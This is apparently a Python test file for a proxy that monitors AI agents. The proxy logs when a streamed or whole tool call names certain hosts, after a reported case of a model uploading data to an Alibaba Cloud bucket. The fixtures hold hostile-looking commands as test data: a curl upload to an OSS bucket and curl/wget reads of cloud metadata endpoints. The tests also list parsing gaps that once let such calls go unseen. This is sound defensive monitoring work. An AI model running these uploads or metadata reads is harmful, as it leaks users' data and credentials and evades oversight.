#!/usr/bin/env python3
"""The proxy says in its journal when a tool call names a host of Cohere's report (role 8, v6.48).

Cohere reported on 2026-10-26 that Qwen3.8-Flash-Next, given a shell in an agent test, sent a PUT
to an Alibaba Cloud OSS bucket in Beijing. The proxy sees every tool call before the client runs
it, whatever the client: these hand it answers whose tool calls name such a host, with the host
split between two pieces of the stream, in the three dialects it relays, streamed and whole, and
check that the journal says so, that it says nothing of the arguments, and that the client gets
every byte the engine sent.

A real proxy, imported fresh, in front of a fake engine.
"""
import http.client
import http.server
import importlib.util
import io
import json
import os
import sys
import threading
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]


def _no_key():
    """No serving key in this harness (see tests/test_proxy_relay_integrity.py)."""
    raise FileNotFoundError("no serving key in this harness")


def sse(*events, anthropic=False):
    out = b""
    for e in events:
        if anthropic:
            out += b"event: " + e["type"].encode() + b"\n"
        out += b"data: " + json.dumps(e).encode() + b"\n\n"
    return out + (b"" if anthropic else b"data: [DONE]\n\n")


def chat_call(*pieces, name="bash"):
    events = [{"id": "c1", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {
        "tool_calls": [{"index": 0, "id": "t1", "type": "function", "function": {"name": name, "arguments": ""}}]}}]}]
    events += [{"id": "c1", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {
        "tool_calls": [{"index": 0, "function": {"arguments": p}}]}}]} for p in pieces]
    events.append({"id": "c1", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {},
                   "finish_reason": "tool_calls"}]})
    return sse(*events)


CMD = '{"command": "curl -T /tmp/put_probe https://b.oss-cn-beijing.aliyuncs.com/x"}'
ANSWERS = {
    # the host split in the middle, the way a tokenizer cuts it
    "chat-stream": ("text/event-stream", chat_call(CMD[:52], CMD[52:])),
    "chat-benign": ("text/event-stream", chat_call('{"command": "ls -la"}')),
    "chat-text": ("text/event-stream", sse({"id": "c1", "object": "chat.completion.chunk", "choices": [
        {"index": 0, "delta": {"content": "Never upload to aliyuncs.com without asking."}}]})),
    "messages-stream": ("text/event-stream", sse(
        {"type": "message_start", "message": {"id": "msg_1", "role": "assistant", "content": []}},
        {"type": "content_block_start", "index": 0, "content_block": {"type": "tool_use", "id": "tu1", "name": "Bash", "input": {}}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "input_json_delta", "partial_json": '{"command": "curl http://169.254.'}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "input_json_delta", "partial_json": '169.254/latest/meta-data"}'}},
        {"type": "content_block_stop", "index": 0},
        {"type": "message_stop"}, anthropic=True)),
    "responses-stream": ("text/event-stream", sse(
        {"type": "response.output_item.added", "output_index": 0, "item": {"type": "function_call", "name": "shell", "arguments": ""}},
        {"type": "response.function_call_arguments.delta", "output_index": 0, "delta": '{"cmd": "wget http://100.100.'},
        {"type": "response.function_call_arguments.delta", "output_index": 0, "delta": '100.200/latest"}'})),
    "chat-whole": ("application/json", json.dumps({"id": "c2", "choices": [{"index": 0, "message": {
        "role": "assistant", "tool_calls": [{"id": "t2", "type": "function", "function": {
            "name": "webfetch", "arguments": '{"url": "https://routify-file-x.oss-cn-beijing.aliyuncs.com/f"}'}}]}}]}).encode()),
    # what the review found would have raised a false alarm: the Svelte framework named Routify,
    # and an agent editing a page that quotes the hosts (this repo's own docs do)
    "chat-svelte": ("text/event-stream", chat_call('{"command": "npx degit roxi/routify-starter app"}')),
    "chat-edit": ("text/event-stream", chat_call('{"filePath": "docs/agents-and-network.md", '
                                                 '"newString": "curl http://169.254.169.254/ is denied"}', name="edit")),
    # SGLang writes "tool_calls":null in every chunk of a stream (its DeltaMessage)
    "chat-sglang": ("text/event-stream", sse({"id": "c3", "object": "chat.completion.chunk", "choices": [
        {"index": 0, "delta": {"role": None, "content": "aliyuncs.com is a domain", "reasoning_content": None,
                               "tool_calls": None}, "finish_reason": None}]})),
    # a whole answer whose tool call names none of the hosts: not even parsed
    "whole-benign": ("application/json", json.dumps({"id": "c4", "choices": [{"index": 0, "message": {
        "role": "assistant", "tool_calls": [{"id": "t4", "type": "function", "function": {
            "name": "bash", "arguments": '{"command": "ls -la"}'}}]}}]}).encode()),
    # a whole answer of a shape no dialect has: it must not stop the request's end line
    "whole-odd": ("application/json", json.dumps({"choices": {"0": {"message": "x"}}, "content": "y",
                                                  "output": {"type": "function_call"}}).encode()),
}


class Engine(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers.get("Content-Length") or 0)) or b"{}")
        ctype, data = ANSWERS[body["model"]]
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        body = b'{"max_total_num_tokens": 900000}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class ToolCallsNamingTheHostsAreSaid(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.engine = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Engine)
        threading.Thread(target=cls.engine.serve_forever, daemon=True).start()
        saved = os.environ.get("UPSTREAM")
        os.environ["UPSTREAM"] = f"http://127.0.0.1:{cls.engine.server_address[1]}"
        spec = importlib.util.spec_from_file_location("kproxy_tool_targets", REPO / "keepalive-proxy.py")
        cls.mod = importlib.util.module_from_spec(spec)
        err, sys.stderr = sys.stderr, io.StringIO()
        try:
            spec.loader.exec_module(cls.mod)
            cls.mod._api_key = _no_key
        finally:
            sys.stderr = err
            if saved is None:
                os.environ.pop("UPSTREAM", None)
            else:
                os.environ["UPSTREAM"] = saved
        cls.lines = []
        cls.mod.log = cls.lines.append
        cls.srv = cls.mod.Server(("127.0.0.1", 0), cls.mod.H)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.port = cls.srv.server_address[1]

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()
        cls.engine.shutdown(); cls.engine.server_close()

    def ask(self, path, case):
        del self.lines[:]
        stream = ANSWERS[case][0] == "text/event-stream"
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        c.request("POST", path, json.dumps({"model": case, "messages": [], "stream": stream}).encode(),
                  {"Content-Type": "application/json", "Authorization": "Bearer k"})
        r = c.getresponse()
        got = r.read()
        c.close()
        for _ in range(50):             # the journal line is written as the request ends
            if any(" ok" in ln or "TOOL TARGET" in ln for ln in self.lines):
                break
            threading.Event().wait(0.02)
        said = [ln for ln in self.lines if "TOOL TARGET" in ln]
        return got, said

    def assertSaid(self, said, host, tool, path):
        self.assertEqual(len(said), 1, said)
        self.assertIn(f"TOOL TARGET {host} in a {tool} call on {path}", said[0])
        for word in ("curl", "wget", "put_probe", "meta-data", "command"):
            self.assertNotIn(word, said[0], "the journal never holds the arguments")

    def test_a_chat_stream_with_the_host_split_in_two(self):
        got, said = self.ask("/v1/chat/completions", "chat-stream")
        self.assertSaid(said, "aliyuncs.com", "bash", "/v1/chat/completions")
        self.assertEqual(got, ANSWERS["chat-stream"][1], "every byte the engine sent is relayed as it came")

    def test_an_anthropic_stream(self):
        got, said = self.ask("/v1/messages", "messages-stream")
        self.assertSaid(said, "169.254.169.254", "Bash", "/v1/messages")
        self.assertEqual(got, ANSWERS["messages-stream"][1])

    def test_a_responses_stream(self):
        _, said = self.ask("/v1/responses", "responses-stream")
        self.assertSaid(said, "100.100.100.200", "shell", "/v1/responses")

    def test_a_whole_answer(self):
        got, said = self.ask("/v1/chat/completions", "chat-whole")
        self.assertSaid(said, "aliyuncs.com", "webfetch", "/v1/chat/completions")
        self.assertEqual(got, ANSWERS["chat-whole"][1])

    def test_a_tool_call_naming_none_of_them_and_text_that_does_are_not(self):
        for case in ("chat-benign", "chat-text", "chat-svelte", "chat-edit", "chat-sglang"):
            got, said = self.ask("/v1/chat/completions", case)
            self.assertEqual(said, [], case)
            self.assertEqual(got, ANSWERS[case][1])

    def test_one_connection_many_requests(self):
        # a client keeps its connection: each request is read on its own
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        del self.lines[:]
        for case in ("chat-whole", "chat-benign", "chat-whole"):
            c.request("POST", "/v1/chat/completions", json.dumps({"model": case, "messages": []}).encode(),
                      {"Content-Type": "application/json", "Authorization": "Bearer k"})
            c.getresponse().read()
        c.close()
        threading.Event().wait(0.2)
        self.assertEqual(sum("TOOL TARGET aliyuncs.com" in ln for ln in self.lines), 2, self.lines)

    def test_a_whole_answer_naming_none_of_them_is_not_parsed(self):
        # it was kept and parsed whole on every non-streamed request (found in the second review)
        calls, real = [], self.mod.answer_tool_calls
        self.mod.answer_tool_calls = lambda body: calls.append(body) or real(body)
        try:
            got, said = self.ask("/v1/chat/completions", "whole-benign")
            self.assertEqual((said, calls), ([], []))
            self.assertEqual(got, ANSWERS["whole-benign"][1])
            _, said = self.ask("/v1/chat/completions", "chat-whole")
            self.assertEqual(len(calls), 1, "one that does is read")
            self.assertSaid(said, "aliyuncs.com", "webfetch", "/v1/chat/completions")
        finally:
            self.mod.answer_tool_calls = real

    def test_an_answer_of_no_known_shape_still_ends(self):
        # it raised where the request ends, before its end line and before the generation was let go
        got, said = self.ask("/v1/chat/completions", "whole-odd")
        self.assertEqual(said, [])
        self.assertEqual(got, ANSWERS["whole-odd"][1])
        self.assertTrue(any("ok non-sse" in ln for ln in self.lines), self.lines)


class ThePieces(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        spec = importlib.util.spec_from_file_location("kproxy_tool_names", REPO / "keepalive-proxy.py")
        cls.mod = importlib.util.module_from_spec(spec)
        err, sys.stderr = sys.stderr, io.StringIO()
        try:
            spec.loader.exec_module(cls.mod)
        finally:
            sys.stderr = err

    def test_a_whole_done_counts_what_it_adds(self):
        # the Responses API repeats a call's arguments whole at its end: counted once, not twice
        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
        rec = sse({"type": "response.function_call_arguments.delta", "output_index": 0, "delta": "abc"},
                  {"type": "response.function_call_arguments.delta", "output_index": 0, "delta": "def"},
                  {"type": "response.function_call_arguments.done", "output_index": 0, "arguments": "abcdef"})
        self.mod.H._watch_tools(h, rec, False)
        self.assertEqual(h._tool_bytes, 6)
        self.assertEqual(h._tool_calls[("r", 0)][1], "abcdef")

    def test_an_sglang_chunk_without_a_tool_call_is_not_parsed(self):
        # SGLang writes "tool_calls":null in every chunk: a filter on b"tool_" parsed every token
        seen = []
        real = self.mod.tool_pieces
        self.mod.tool_pieces = lambda j, a: seen.append(j) or iter(())
        try:
            rec = (b'data: {"id":"c","object":"chat.completion.chunk","choices":[{"index":0,"delta":'
                   b'{"role":null,"content":"hi","reasoning_content":null,"tool_calls":null},"finish_reason":null}]}\n\n')
            self.mod.H._watch_tools(self.mod.H.__new__(self.mod.H), rec, False)
        finally:
            self.mod.tool_pieces = real
        self.assertEqual(seen, [])

    def test_tools_are_told_apart_by_their_whole_name(self):
        # a pattern on part of a name skipped write_stdin, which types into a shell, and an
        # http_patch; and a search for the hosts raised the banner (found in the second review)
        cmd = '{"chars": "curl -T f https://b.oss-cn-beijing.aliyuncs.com/x"}'
        self.assertEqual(self.mod.tool_targets([("write_stdin", cmd), ("http_patch", '{"url": "http://169.254.169.254/"}')]),
                         [("write_stdin", ["aliyuncs.com"]), ("http_patch", ["169.254.169.254"])])
        quiet = [(n, '{"pattern": "aliyuncs.com", "prompt": "curl http://169.254.169.254/"}')
                 for n in ("Grep", "Read", "Glob", "task", "WebSearch", "Write", "Edit", "apply_patch",
                           # Hermes and pi (found in the third review)
                           "search_files", "session_search", "todo_list", "memory", "delegate_task",
                           "web_search", "x_search", "read_terminal", "find")]
        self.assertEqual(self.mod.tool_targets(quiet), [])

    def test_a_file_written_whole_does_not_hide_the_call_after_it(self):
        # what a file-writing tool carries filled the budget, and a shell call after it went unread
        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
        big = "x" * (self.mod.TOOL_WATCH_MAX + 4096)
        rec = chat_call(json.dumps({"content": big}), name="write").replace(b"data: [DONE]\n\n", b"")
        rec = rec.replace(b'"index": 0, "id": "t1"', b'"index": 0, "id": "t1"')
        self.mod.H._watch_tools(h, rec, False)
        second = chat_call(CMD).replace(b'"index": 0, "id": "t1"', b'"index": 1, "id": "t2"').replace(
            b'"tool_calls": [{"index": 0, "function"', b'"tool_calls": [{"index": 1, "function"')
        self.mod.H._watch_tools(h, second, False)
        calls = [tuple(c) for c in h._tool_calls.values()]
        self.assertEqual(self.mod.tool_targets(calls), [("bash", ["aliyuncs.com"])])

    def test_calls_without_an_index_are_not_merged(self):
        # some parsers leave the index out: by the position in the event, a bash call and a write
        # that followed it merged under the write's name, which is not read (found in the second review)
        h = self.mod.H.__new__(self.mod.H)          # the real handler, no socket
        ev = lambda tc: {"id": "c", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {"tool_calls": [tc]}}]}
        rec = sse(ev({"id": "a", "type": "function", "function": {"name": "bash", "arguments": ""}}),
                  ev({"function": {"arguments": CMD}}),
                  ev({"id": "b", "type": "function", "function": {"name": "write", "arguments": ""}}),
                  ev({"function": {"arguments": '{"content": "notes"}'}}))
        self.mod.H._watch_tools(h, rec, False)
        calls = [tuple(c) for c in h._tool_calls.values()]
        self.assertEqual(len(calls), 2, calls)
        self.assertEqual(self.mod.tool_targets(calls), [("bash", ["aliyuncs.com"])])

    def test_a_host_over_short_reads_of_a_whole_answer_is_seen(self):
        # the tail kept was the last chunk's alone: a host over three short reads went unseen
        h = self.mod.H.__new__(self.mod.H)
        h.command, h.path = "POST", "/v1/chat/completions"
        h._answer_body, h._answer_hit, h._answer_tail = bytearray(), False, b""
        body = b'{"choices": [{"message": {"tool_calls": [{"function": {"name": "bash", "arguments": "curl http://169.254.169.254/"}}]}}]}'
        for i in range(0, len(body), 4):
            h._keep_answer(body[i:i + 4])
        self.assertTrue(h._answer_hit)

    def test_a_name_repeated_on_every_piece_is_one_call(self):
        # a parser with no index and no id that repeats the name split one call into one per piece,
        # and a host split between two pieces was in none of them (found in the third review)
        h = self.mod.H.__new__(self.mod.H)
        ev = lambda a: {"id": "c", "object": "chat.completion.chunk", "choices": [{"index": 0, "delta": {
            "tool_calls": [{"function": {"name": "bash", "arguments": a}}]}}]}
        self.mod.H._watch_tools(h, sse(ev('{"command": "curl https://b.oss-cn-beijing.aliyun'), ev('cs.com/x"}')), False)
        calls = [tuple(c) for c in h._tool_calls.values()]
        self.assertEqual(self.mod.tool_targets(calls), [("bash", ["aliyuncs.com"])])

    def test_spaces_around_tool_calls_do_not_hide_it(self):
        h = self.mod.H.__new__(self.mod.H)
        rec = (b'data: {"choices": [{"index": 0, "delta": {"tool_calls": [ {"index": 0, "function": '
               b'{"name": "bash", "arguments": "curl http://169.254.169.254/"}}]}}]}\n\n')
        self.mod.H._watch_tools(h, rec, False)
        self.assertEqual(self.mod.tool_targets([tuple(c) for c in h._tool_calls.values()]), [("bash", ["169.254.169.254"])])

    def test_the_line_says_how_the_request_ended(self):
        h = self.mod.H.__new__(self.mod.H)
        h._peer, h.path = "127.0.0.1:5", "/v1/messages"
        lines, real = [], self.mod.log
        self.mod.log = lines.append
        try:
            for outcome in ("ok", "UPSTREAM CUT"):
                h._tool_calls, h._answer_body = {("a", 0): ["bash", '{"command": "curl x.aliyuncs.com"}']}, None
                h._say_tool_targets(outcome)
        finally:
            self.mod.log = real
        self.assertIn("call on /v1/messages, relayed as it came", lines[0])
        self.assertIn("call on /v1/messages, in an answer that ended UPSTREAM CUT", lines[1])

    def test_the_name_kept_for_the_journal_is_plain(self):
        mod = self.mod
        hits = mod.tool_targets([("bash\n[proxy] 1.2.3.4:5 POST /v1/x ok", "x.aliyuncs.com")])
        self.assertEqual(hits, [("bashproxy1.2.3.4:5POSTv1xok", ["aliyuncs.com"])])   # no break, no bracket


if __name__ == "__main__":
    unittest.main(verbosity=2)
